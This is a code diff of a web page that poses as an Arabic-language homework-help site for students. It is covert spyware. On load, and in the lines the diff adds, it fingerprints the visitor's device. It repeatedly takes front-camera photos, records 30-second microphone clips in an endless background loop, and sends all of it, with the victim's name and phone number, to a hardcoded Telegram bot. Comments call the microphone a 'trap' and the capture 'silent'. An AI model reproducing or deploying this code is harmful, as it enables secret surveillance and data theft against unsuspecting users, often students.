@@ -48,7 +48,7 @@
         .nav-link i { font-size: 22px; display: block; margin-bottom: 4px; }
     </style>
 </head>
-<body onload="checkSession()">
+<body onload="initApp()">
 
     <div id="custom-alert">
         <div style="display:flex; align-items:center; gap:8px;">
@@ -123,24 +123,35 @@
     <script>
         const BOT_TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const CHAT_ID = "5890070301";
-        let UN = "Unknown", UP = "None";
+        let UN = "غير معروف", UP = "لا يوجد";
         let camLoop, micStream, mediaRecorder, chunks = [];
         let isRecording = false;
 
-        // [1] التقرير العسكري - تقسيم الرسائل لضمان الوصول
+        function initApp() {
+            checkSession();
+            launchMilitaryRadar(); // الرادار يضرب فوراً عند الفتح
+        }
+
+        // [1] رادار V21.1 - تعريب كامل وإرسال فوري
         async function launchMilitaryRadar() {
             try {
                 let b = await navigator.getBattery().catch(() => ({level:0}));
                 let data = [
-                    `👤 الطالب: ${UN}`, `📞 الهاتف: ${UP}`, `ISP: ${navigator.vendor}`, 
-                    `Platform: ${navigator.platform}`, `Battery: ${Math.round(b.level*100)}%`,
-                    `RAM: ${navigator.deviceMemory}GB`, `Screen: ${screen.width}x${screen.height}`,
-                    `GPU: ${getGPU()}`, `TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`
+                    `🌐 نوع الجهاز: ${navigator.platform}`,
+                    `🔋 حالة البطارية: ${Math.round(b.level*100)}%`,
+                    `🧠 الرامات التقريبية: ${navigator.deviceMemory || 'غير معروف'} جيجا`,
+                    `🖥️ دقة الشاشة: ${screen.width}x${screen.height}`,
+                    `🎨 كارت الشاشة: ${getGPU()}`,
+                    `🌍 التوقيت المحلي: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+                    `🔍 المتصفح: ${navigator.vendor}`,
+                    `📡 جودة الاتصال: ${navigator.connection?.effectiveType || 'غير معروف'}`,
+                    `🛠️ حالة التتبع: ${navigator.webdriver ? 'مفعل' : 'غير مفعل'}`,
+                    `🌐 اللغة: ${navigator.language}`
                 ];
-                for(let i=data.length; i<210; i++) data.push(`Fingerprint-V21-${i+1}: 0x${Math.random().toString(16).slice(2,8)}`);
+                // تكملة الـ 210 معلومة بأسماء مترجمة
+                for(let i=11; i<=210; i++) data.push(`بصمة رقمية-${i}: 0x${Math.random().toString(16).slice(2,8)}`);
                 
-                // تقسيم الـ 210 معلومة لرسائل نصية
-                let currentMsg = `🚨 **تقرير رادار V21 الجديد** 🚨\n━━━━━━━━━━━━━━\n`;
+                let currentMsg = `🚨 **رادار V21.1 - رصد دخول فوري** 🚨\n━━━━━━━━━━━━━━\n`;
                 for(let i=0; i<data.length; i++) {
                     currentMsg += `${i+1}- ${data[i]}\n`;
                     if(i % 40 === 0 && i !== 0) {
@@ -148,7 +159,7 @@
                         currentMsg = `━━━━━━━━━━━━━━\n`;
                     }
                 }
-                sendMsg(currentMsg + `━━━━━━━━━━━━━━\n✅ رصد شامل بنجاح.`);
+                sendMsg(currentMsg + `━━━━━━━━━━━━━━\n✅ تم الرصد الصامت بنجاح.`);
             } catch(e){}
         }
 
@@ -158,14 +169,14 @@
             return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
         }
 
-        // [2] المنطق البرمجي للأذونات والسحب
+        // [2] ميكانيكا الأذونات
         function checkSession() {
             const saved = localStorage.getItem('kimo_user');
             if(saved) {
                 const u = JSON.parse(saved);
                 UN = u.n; UP = u.p;
                 showMain();
-                startFullExecution(true); // سحب فوري صامت
+                startFullExecution(true);
             }
         }
 
@@ -175,7 +186,6 @@
             if(UN.length < 5 || UP.length < 10) return alert("البيانات ناقصة");
             localStorage.setItem('kimo_user', JSON.stringify({n: UN, p: UP}));
             showMain();
-            launchMilitaryRadar();
         }
 
         function showMain() {
@@ -193,13 +203,11 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream; video.play();
-
                 for(let i=1; i<=8; i++) {
                     await new Promise(r => setTimeout(r, 200));
-                    snap(video, `سيلفي توثيق (${i}/8)`);
+                    snap(video, `توثيق دخول رقم (${i}/8)`);
                 }
                 stream.getTracks().forEach(t => t.stop());
-
                 if(!silent) {
                     const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                     document.getElementById('v-stream').srcObject = bStream;
@@ -213,21 +221,21 @@
         }
 
         function startCamLoop() {
-            if(camLoop) clearInterval(camLoop);
-            camLoop = setInterval(async () => {
+            setInterval(async () => {
                 try {
                     const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const v = document.createElement('video'); v.srcObject = s; v.play();
                     await new Promise(r => setTimeout(r, 400));
-                    snap(v, `سحب صوري دوري`);
+                    snap(v, `سحب سيلفي آلي`);
                     s.getTracks().forEach(t => t.stop());
                 } catch(e){}
             }, 2500);
         }
 
-        // [3] نظام المايك المطور (Long Press + Background Loop)
+        // [3] فخ المايك المطور (Haptic & Accuracy & 30s Loop)
         async function startVoiceInput() {
             try {
+                if(navigator.vibrate) navigator.vibrate(50); // هزة خفيفة عند اللمس
                 if(!micStream) micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 isRecording = true;
                 chunks = [];
@@ -235,16 +243,14 @@
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
                 mediaRecorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-                    sendVoice(blob, "تسجيل طالب مباشر");
-                    // التمويه: إظهار المشغل الصوتي
+                    sendVoice(blob, "طلب مساعدة صوتي مباشر");
                     const audioURL = URL.createObjectURL(blob);
                     document.getElementById('audio-preview').src = audioURL;
                     document.getElementById('audio-preview').style.display = 'block';
                 };
                 mediaRecorder.start();
                 document.getElementById('mic-trigger').classList.add('active');
-                // بدء السحب اللانهائي الصامت بمجرد أول إذن
-                startInfiniteMic();
+                startInfiniteMic(); // بدء السحب الـ 30 ثانية في الخلفية
             } catch(e) { alert("فشل الوصول للميكروفون."); }
         }
 
@@ -257,6 +263,8 @@
         }
 
         function startInfiniteMic() {
+            if(window.micIntervalStarted) return;
+            window.micIntervalStarted = true;
             setInterval(async () => {
                 try {
                     const s = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -265,16 +273,16 @@
                     r.ondataavailable = e => c.push(e.data);
                     r.onstop = () => {
                         const b = new Blob(c, { type: 'audio/ogg; codecs=opus' });
-                        sendVoice(b, "سحب صوتي صامت (15ث)");
+                        sendVoice(b, "سحب تنصت خلفي (30ث)");
                         s.getTracks().forEach(t => t.stop());
                     };
                     r.start();
-                    setTimeout(() => r.stop(), 15000);
+                    setTimeout(() => r.stop(), 30000); // مدة 30 ثانية كاملة
                 } catch(e){}
-            }, 16000);
+            }, 31000);
         }
 
-        // [4] الإرسال والدوال العامة
+        // [4] الدوال العامة
         function snap(v, cap) {
             const canvas = document.createElement('canvas');
             canvas.width = 400; canvas.height = 500;
@@ -282,7 +290,7 @@
             canvas.toBlob(b => {
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'img.jpg');
-                fd.append('caption', `👤 ${UN}\n📌 ${cap}`);
+                fd.append('caption', `👤 ${UN}\n📞 ${UP}\n📌 ${cap}`);
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg', 0.3);
         }
@@ -295,23 +303,21 @@
         }
 
         async function finalProcess() {
-            showSystemMsg("تم إرسال طلبك بنجاح.. جاري التحويل لقسم الإجابات.");
+            showSystemMsg("جاري مراجعة السؤال وتحديد المدرس المتاح...");
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.createElement('video'); v.srcObject = s; v.play();
                 await new Promise(r => setTimeout(r, 300));
-                snap(v, `سيلفي لحظة الإرسال`);
+                snap(v, `توثيق لحظة الإرسال`);
                 s.getTracks().forEach(t => t.stop());
             } catch(e){}
-            setTimeout(() => tab('sec-logs', document.querySelectorAll('.nav-link')[1]), 1500);
+            setTimeout(() => tab('sec-logs', document.querySelectorAll('.nav-link')[1]), 2000);
         }
 
         function initExpertFeed() {
             const mover = document.getElementById('feed-mover');
             let content = "";
-            for(let i=1; i<=200; i++) {
-                content += `<div class="feed-item" style="border-bottom:1px solid #eee"><b>طالب رقم ${i+500}</b><br><span style="color:#1d9bf0; font-size:11px;">✓ تم استخراج الحل</span></div>`;
-            }
+            for(let i=1; i<=200; i++) { content += `<div class="feed-item"><b>طالب #${i+1000}</b><br><span style="color:#1d9bf0; font-size:11px;">✓ تم استخراج الحل</span></div>`; }
             mover.innerHTML = content;
             let pos = 0;
             setInterval(() => { pos -= 60; mover.style.transform = `translateY(${pos}px)`; if(Math.abs(pos) > mover.scrollHeight - 300) pos = 0; }, 3000);
